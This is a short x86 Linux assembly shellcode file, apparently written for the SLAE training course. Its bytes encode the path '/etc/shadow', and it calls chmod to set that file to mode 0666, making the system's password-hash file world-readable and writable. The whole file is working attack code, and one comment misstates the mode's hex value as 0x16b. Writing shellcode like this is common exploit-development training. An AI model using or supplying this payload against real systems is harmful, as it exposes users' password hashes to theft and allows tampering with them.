; By  SLAE - 1459 10 april 2019 

global _start
section .text
_start:
        jmp short shellcode 	;jmp , call ,pop technique
test:
        pop ebx			;point to stack
        xor eax,eax		;clear regestiers
        xor ecx,ecx

	mov cl, 0xb6		
        mov ch, 0x1		; ECX=0x16b ---> OCT=666 the mode
        mov al,0xf		; EAX =15 chmod system call

        int 0x80

; simple exit
	push byte 1
	pop eax
	int 0x80 

shellcode:
        call test	; this will push the shell to stack at once
        Shellcode: db 0x2f,0x65,0x74,0x63,0x2f,0x73,0x68,0x61,0x64,0x6f,0x77

